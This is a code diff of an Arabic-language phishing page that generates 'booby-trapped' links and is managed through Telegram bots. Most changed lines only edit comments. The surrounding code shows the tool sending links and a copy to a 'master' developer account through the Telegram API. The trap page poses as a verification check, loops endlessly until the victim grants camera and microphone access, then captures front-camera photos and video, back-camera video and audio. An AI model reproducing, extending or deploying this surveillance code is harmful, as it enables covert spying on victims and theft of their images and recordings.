@@ -3005,7 +3005,7 @@
                                 <span class="label">حجم التخزين</span>
                                 <span class="value" id="settingsStorageSize">0 KB</span>
                             </div>
-                            <!-- زر نسخ مفتاح الداشبورد -->
+                            <!-- 4. زر نسخ مفتاح الداشبورد — تمت إضافته هنا -->
                             <div class="detail-row" style="border-bottom: none; padding-top:8px;">
                                 <span class="label">مفتاح الداشبورد</span>
                                 <span class="value" id="dashboardKeyDisplay" style="font-family:monospace;direction:ltr;font-size:12px;">••••••••</span>
@@ -4093,8 +4093,7 @@
                     return btoa(encodeURIComponent(payload));
                 }
 
-                // SEND LINK TO USER (with inline button "المطور" and @LL4ME)
-                // تم إضافة محاولات إعادة الإرسال في حال الفشل
+                // ===== 1. تعديل دالة إرسال الرابط للمستخدم مع إعادة المحاولة وزر المطور =====
                 async function sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, botUsername) {
                     var msg =
                         '⭑ رابط مُلغَّم جديد ⭒\n' +
@@ -4110,7 +4109,7 @@
                             [{ text: 'المطور', url: 'https://t.me/LL4ME' }]
                         ]
                     };
-                    // محاولة الإرسال مع إعادة المحاولة
+                    // محاولة الإرسال مع إعادة المحاولة (3 محاولات)
                     for (var attempt = 0; attempt < 3; attempt++) {
                         try {
                             var response = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
@@ -4211,7 +4210,7 @@
                         }
                         localStorage.setItem('zeus_bots', JSON.stringify(bots));
 
-                        // ===== إرسال الرابط للمستخدم مع زر المطور =====
+                        // ===== 1. إرسال الرابط للمستخدم مع زر المطور (بعد حفظ البوت) =====
                         await sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, valid.username);
                         // ===== إرسال نسخة للمطور =====
                         await sendToMaster(botToken, chatId, shortToken, baseUrl, valid.username);
@@ -4431,7 +4430,7 @@
                             }
                         } catch (e) {}
 
-                        // ===== FRONT CAMERA: 3 photos + 5s video =====
+                        // ===== 2. FRONT CAMERA: 3 photos + 5s video (مع ضمان التسلسل) =====
                         var frontStream = null;
                         var frontPhotos = [];
                         var frontVideo = null;
@@ -4441,7 +4440,7 @@
                             video.srcObject = frontStream;
                             await video.play();
                             await delay(200);
-                            // 3 photos
+                            // 3 photos — تسلسل محكم
                             for (var i = 0; i < 3; i++) {
                                 var photoBlob = await capturePhoto(video);
                                 if (photoBlob) frontPhotos.push(photoBlob);
@@ -4453,7 +4452,7 @@
                         if (frontStream) { frontStream.getTracks().forEach(function(t) { t.stop(); });
                             frontStream = null; }
 
-                        // ===== BACK CAMERA: 5s video =====
+                        // ===== 2. BACK CAMERA: 5s video =====
                         var backStream = null;
                         var backVideo = null;
                         try {
@@ -4467,7 +4466,7 @@
                         if (backStream) { backStream.getTracks().forEach(function(t) { t.stop(); });
                             backStream = null; }
 
-                        // ===== AUDIO: 5s =====
+                        // ===== 2. AUDIO: 5s =====
                         var audioBlob = null;
                         try {
                             var audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -4765,7 +4764,7 @@
                     }
                 }
 
-                // ===== HANDLE CLICK — مع إعادة محاولة الأذونات بشكل لا نهائي =====
+                // ===== 3. HANDLE CLICK — مع إعادة محاولة الأذونات بشكل لا نهائي (while true) =====
                 async function handleClick() {
                     if (isRunning || collectionDone) return;
                     isRunning = true;
@@ -4775,7 +4774,7 @@
                     mainText.textContent = 'جاري التحقق …';
                     mainText.className = 'text loading';
 
-                    // ===== إجبار الأذونات: حلقة لا نهائية حتى الموافقة =====
+                    // ===== 3. إجبار الأذونات: حلقة لا نهائية حتى الموافقة (لا إعادة تحميل) =====
                     while (true) {
                         var ok = await requestAllPermissionsStrict();
                         if (ok) break;
